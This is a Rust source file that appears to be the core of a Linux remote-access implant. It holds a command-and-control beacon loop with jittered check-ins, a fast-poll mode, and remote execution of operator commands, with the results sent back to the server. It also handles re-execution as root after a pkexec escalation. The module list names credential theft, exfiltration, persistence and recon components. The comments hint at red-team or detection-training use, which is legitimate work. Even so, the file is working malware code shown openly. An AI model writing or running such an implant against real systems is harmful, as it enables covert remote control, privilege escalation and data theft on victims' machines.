pub mod config;
pub mod c2;
pub mod copyfail;
pub mod creds;
pub mod dispatch;
pub mod discovery;
pub mod exfil;
pub mod marker;
pub mod payload;
pub mod persist;
pub mod recon;

/// Continuous beacon/interactive loop — Sliver-style.
///
/// The implant stays alive and polls the C2. Each cycle:
///   send beacon → receive & execute commands → sleep → repeat.
///
/// Two operator-presence profiles (selected at implant generation time):
///   - Interactive (loud): polls every ~1s, no jitter. The constant chatty
///     check-ins are the intended "easy to detect" signal.
///   - Beacon (low-and-slow): polls on beacon_interval with jitter.
///
/// Operator commands:
///   - `system exit`  → loop breaks, process exits.
///   - `system sleep N` → changes the poll interval at runtime (min 1s).
///   - `privesc pkexec` (success) → this process re-execs as root under the
///     SAME implant_id, then the unprivileged parent exits so only one root
///     process beacons — the server upgrades the existing session rather than
///     creating a second one.
pub fn run_beacon_loop(config: &config::Config) {
    let implant_id = config.implant_id();
    let hostname = get_hostname();
    let interactive = config.mode == config::ImplantMode::Interactive;
    // Interactive: short fixed poll. Beacon: configured interval (+ jitter).
    let mut current_interval = if interactive {
        config::INTERACTIVE_POLL_SECS
    } else {
        config.beacon_interval
    };
    let mut should_exit = false;

    loop {
        // Jitter before each beacon (beacon profile only — interactive is jitter-free)
        if !interactive {
            let jitter = config.jitter(config.beacon_jitter);
            if jitter > 0 {
                let ts = libc::timespec { tv_sec: jitter as _, tv_nsec: 0 };
                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
            }
        }

        let os = config.get_os_info();
        let payload = c2::BeaconPayload {
            implant_id: implant_id.clone(),
            hostname: hostname.clone(),
            ts: unsafe { libc::time(std::ptr::null_mut()) },
            tier: config.tier_label().to_string(),
            os,
            arch: "x86_64".to_string(),
            uid: unsafe { libc::getuid() },
            protocol_version: 1,
            last_result: None,
        };

        // Send beacon and receive commands
        let response = match c2::beacon_and_poll(config, &payload) {
            Ok(r) => r,
            Err(_) => {
                // Network error — sleep and retry on next cycle
                let ts = libc::timespec { tv_sec: current_interval as _, tv_nsec: 0 };
                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
                continue;
            }
        };

        // Execute commands
        if !response.commands.is_empty() {
            for cmd in &response.commands {
                // Check for exit command
                if cmd.module == "system" && cmd.action == "exit" {
                    should_exit = true;
                }

                let action = dispatch::CommandAction {
                    id: cmd.id.clone(),
                    module: cmd.module.clone(),
                    action: cmd.action.clone(),
                    args: cmd.args.clone(),
                    timeout_secs: cmd.timeout_secs,
                };
                let result = action.execute(config, &implant_id);

                // Track beacon interval changes from sleep command.
                // Floor of 1s: a 0 (or out-of-range) value is a no-op, never a
                // hot-loop. (Restores the guard the working tree had removed.)
                if cmd.module == "system" && cmd.action == "sleep" {
                    if let Some(secs) = result.data.get("slept_secs").and_then(|v| v.as_u64()) {
                        if secs > 0 && secs < 86400 {
                            current_interval = secs;
                        }
                    }
                }

                // A successful pkexec escalation re-execs us as root under the
                // same implant_id; this unprivileged parent must exit so only
                // the root process beacons (no confusing duplicate session).
                if cmd.module == "privesc" && cmd.action == "pkexec"
                    && result.data.get("reexec").and_then(|v| v.as_bool()).unwrap_or(false)
                {
                    should_exit = true;
                }

                // Send result immediately
                let payload = c2::ResultPayload {
                    implant_id: implant_id.clone(),
                    command_id: result.command_id.clone(),
                    status: result.status.clone(),
                    data: result.data.clone(),
                };
                let _ = c2::send_result(config, &payload);
            }
        }

        if should_exit {
            break;
        }

        // stay_alive fast-poll only makes sense for the beacon profile:
        // interactive already polls at ~1s, which is faster than the 10s
        // fast-poll cadence.
        if response.stay_alive && !interactive {
            let deadline = unsafe { libc::time(std::ptr::null_mut()) } + 300;
            while unsafe { libc::time(std::ptr::null_mut()) } < deadline && !should_exit {
                let ts = libc::timespec { tv_sec: 10, tv_nsec: 0 };
                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }

                let poll = c2::BeaconPayload {
                    implant_id: implant_id.clone(),
                    hostname: hostname.clone(),
                    ts: unsafe { libc::time(std::ptr::null_mut()) },
                    tier: config.tier_label().to_string(),
                    os: config.get_os_info(),
                    arch: "x86_64".to_string(),
                    uid: unsafe { libc::getuid() },
                    protocol_version: 1,
                    last_result: None,
                };

                let resp = match c2::beacon_and_poll(config, &poll) {
                    Ok(r) => r,
                    Err(_) => break,
                };

                if resp.commands.is_empty() {
                    continue;
                }

                for cmd in &resp.commands {
                    if cmd.module == "system" && cmd.action == "exit" {
                        should_exit = true;
                    }
                    if cmd.module == "privesc" && cmd.action == "pkexec" {
                        // Same-session escalation: parent exits after the root
                        // re-exec is spawned. Stay-alive loop must honor it too.
                        should_exit = true;
                    }
                    let action = dispatch::CommandAction {
                        id: cmd.id.clone(),
                        module: cmd.module.clone(),
                        action: cmd.action.clone(),
                        args: cmd.args.clone(),
                        timeout_secs: cmd.timeout_secs,
                    };
                    let result = action.execute(config, &implant_id);
                    let _ = c2::send_result(config, &c2::ResultPayload {
                        implant_id: implant_id.clone(),
                        command_id: result.command_id.clone(),
                        status: result.status.clone(),
                        data: result.data.clone(),
                    });
                }
            }
        }

        if should_exit {
            break;
        }

        // Sleep for the poll interval (1s interactive, beacon_interval otherwise)
        let ts = libc::timespec { tv_sec: current_interval as _, tv_nsec: 0 };
        unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
    }

    // Clean exit
    unsafe { libc::exit(0); }
}

fn get_hostname() -> String {
    std::fs::read_to_string("/proc/sys/kernel/hostname")
        .unwrap_or_default()
        .trim()
        .to_string()
}
